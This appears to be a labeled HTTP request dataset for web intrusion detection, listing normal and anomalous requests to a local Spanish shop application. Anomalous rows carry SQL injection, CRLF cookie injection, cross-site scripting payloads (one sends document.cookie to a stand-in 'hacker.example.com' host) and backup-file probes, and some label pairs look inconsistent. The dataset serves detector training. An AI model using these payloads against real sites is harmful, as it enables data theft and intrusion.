Normal 0 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tejani&password=arable&nombre=Josiana&apellidos=De+Anta+Colondres&email=agunda-wulff%40onoratoinformatica.aq&dni=427%278643%27&direccion=C%2F+Jose+Zamoray%2C+S%2FN+4C&ciudad=Narros+del+Puerto&cp=23770&provincia=Tarragona&ntc=2400850921681991&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gargulak&password=Bu7c2Pi%E9&nombre=Deysi&apellidos=Benapr%E9s+Vaqu%E9&email=ontiveros%40masqueclases.th&dni=50422961S&direccion=C%2Fjon+Pe%F1uelas%2C+117%2C+&ciudad=Quintanas+de+Gormaz&cp=38435&provincia=Valencia&ntc=9947210285103354&B1=Registrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bienek&pwd=cloqu%27e%2Fro&remember=off&B1=Entrar HTTP/1.1
Anomalous 1 POST id=3%2F&nombre=Vino+Rioja&precio=85&cantidad=35&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1.bak HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=majd&password=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&nombre=Osmar&apellidos=Blandon+Dato&email=scales_vlaenderen%40conoceagelespa%F1a.gg&dni=15613671Y&direccion=Calle+Isla+De+Corcega+87%2C+1-B&ciudad=Viladecans&cp=48144&provincia=Barcelona&ntc=4635391000655529&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85%7C&cantidad=67&B1=A%F1adir+al+carrito HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=peiser&password=9iri7aza&nombre=Nevel&apellidos=Domenge+Canelas&email=kirland-lincovsky%40la-sexta-f1.fo&dni=48549953N&direccion=Rio+Jarama+194+6-H&ciudad=Valverdejo&cp=20150&provincia=Toledo&ntc=9766800722499068&B1=Registrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=8659&B1=Pasar+por+caja HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6840&B1=Pasar+por+caja%2F HTTP/1.1
Anomalous 1 POST B2A=Vaciar+carrito http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/global.OLD HTTP/1.1
Anomalous 0 POST errorMsg=Credenciales+incorrectas%4040 http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/busytime.nsf HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=4828&B1=Confirmar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=roig&password=a4ev1l19&nombre=Ra%FAl&apellidos=Esterric+Bou&email=munshin%40cirugiaplasticacordoba.hk&dni=42473286Z&direccion=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&ciudad=Alcaraz&cp=40291&provincia=Huesca&ntc=4538972829961563&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=1136&B1=Pasar+por+caja HTTP/1.1
Normal 0 POST id=2 http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Anomalous 0 POST modo=entrar&login=cheng&pwd=cazc%2Calear&remember=off&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9043&B1=Pasar+por+caja%2F HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
Anomalous 1 POST modo=registro&login=mitsuiparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&password=d2S3O1nil2ar&nombre=Tea&apellidos=Cabrera+Noguera&email=holzer-hammersley4%40discon.in&dni=21034297S&direccion=Guadamacil%2C+198%2C+&ciudad=Torrejoncillo&cp=08779&provincia=Teruel&ntc=4706372444418662&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
Anomalous 1 POST modo=registro&login=perrotta4&password=-fortificaci%F3n&nombreA=Temistocles&apellidos=Bastidas+Lacruz&email=butch%407horas.coop&dni=64652659G&direccion=Calle+Cristo+86%2C+2G&ciudad=Berrocalejo+de+Aragona&cp=10520&provincia=Girona&ntc=8239878600110127&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 POST modo=registro&login=raab&password=ac6%EDdi9o&nombre=Thal%EDa&apellidos=Albornoz+Quiva&email=heldabrand5%40chevrolet-volt.bg&dni=11738063J&direccion=C%2F+Otumba%2C+132%2C+&ciudad=Carataunas&cp=43791&provincia=Cuenca&ntc=8400067402160298&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=libbey&pwd=141c1U01&remember=on&B1A=Entrar HTTP/1.1
Anomalous 1 POST modo=entrar&login=raymund&pwd=pist%F3n&remember=on&B1=%253F http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/6909030637832563290.jsp.Old HTTP/1.1
Anomalous 1 POST id=3%2F&nombre=Vino+Rioja&precio=39&cantidad=90&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous 1 POST errorMsgA=Credenciales+incorrectas http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous 1 POST idA=1 http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Normal 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hocutt&password=MonTE9A&nombre=Sibila&apellidos=Garcez+Iturriria&email=neugebauer%40buscamoto.gw&dni=37246742J&direccion=Galeno+106%2C+9%3FC&ciudad=Ciadoncha&cp=17744&provincia=Segovia&ntc=8444341614355746&B1=Registrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&precio=7931&B1=Confirmar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/asf-logo-wide.gif HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
Normal 1 GET  http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=28&B1=A%F1adir+al+carrito HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%7C HTTP/1.1
Anomalous 1 POST errorMsg=%2500 http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous 1 POST modo=registro&login=ca%2Bri%2Bta&password=import%21ador&nombre=Leinad&apellidos=Alabart&email=koyama%40civicosdns.jp&dni=19113499Q&direccion=C%2F+Silvinita+95%2C+11D&ciudad=Cordobilla+de+L%E1cara&cp=16800&provincia=Cuenca&ntc=9775185207171671&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/imagenes/nuestratierra.jpg/asf-logo-wide.gif/.OLD HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=derosenr&password=abarracar&nombre=Trist%E1n&apellidos=Pol+Lazcano&email=braverman-watkin%40docerosas.pl&dni=28010640K&direccionA=C%2F+Antoni+Rosello+i+Nadal+172+&ciudad=Blancafort&cp=50522&provincia=Burgos&ntc=7871877495462595&B1=Registrar HTTP/1.1
Anomalous 1 POST B2A=Vaciar+carrito http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
Anomalous 1 POST modo=insertar&precio=5075&B1=Confirmar%2F http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
Anomalous 1 POST modo=entrar&loginA=maijala&pwd=indiv%21idualmente&remember=on&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=iwona&pwd=pantorrilluda&rememberA=off&B1=Entrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/asf-logo-wide.inc HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
Anomalous 1 POST modo=entrar&login=kuchinsk&pwd=rogadora&remember=off&B1=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Ques%2Bo+Manchego&precio=85&cantidad=91&B1=A%F1adir+al+carrito HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/.INC HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=youngman&password=a018699t0do&nombre=Ibar&apellidos=Linga%2Fn&email=damboise%40automovilesalhambra.co&dni=44906096E&direccion=Calle+Lima%2C+50+9-D&ciudad=Catadau&cp=42066&provincia=Madrid&ntc=0908077134973737&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
Anomalous 1 POST modo=registro&login=charla&password=hi09otismo&nombre=Zita&apellidos=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&email=robb-ghostley%40botilleria.com.sb&dni=09531645P&direccion=Calle+Dresde+25+6%3FD&ciudad=Molezuelas+de+la+Carballeda&cp=08281&provincia=Baleares+%28Illes%29&ntc=7133217385805670&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/index.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
Anomalous 1 POST modo=insertar&precioA=9248&B1=Confirmar http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
Normal 0 POST modo=insertar&precio=0&B1=Confirmar http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/index.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/global/titulo.jsp/6909030637832563290.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
Anomalous 1 PUT id=2 http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/estore/populate HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
Anomalous 1 POST modo=registro&login=raglin&password=m783a1er3&nombre=Careli&apellidos=Navines&email=leclerc6%40soycastellano.gl&dni=52316705P%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&direccion=C%2F+Tavernes+Blanques%2C+S%2FN+&ciudad=Rupi%E0&cp=21610&provincia=Guip%FAzcoa&ntc=8201185179055303&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
Anomalous 1 POST modoA=insertar&precio=7224&B1=Pasar+por+caja http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
